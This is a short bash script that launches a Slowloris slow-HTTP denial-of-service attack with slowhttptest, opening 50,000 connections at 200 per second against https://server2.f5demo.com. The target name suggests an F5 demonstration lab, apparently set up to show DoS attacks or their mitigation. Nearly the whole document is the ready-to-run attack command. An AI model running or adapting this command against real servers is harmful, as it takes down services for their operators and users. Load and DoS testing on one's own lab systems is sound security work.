#!/bin/bash
echo "Starting Slowloris: slowhttptest -c 50000 -r 200 -u https://server2.f5demo.com"
sleep 3
slowhttptest -c 50000 -r 200 -u https://server2.f5demo.com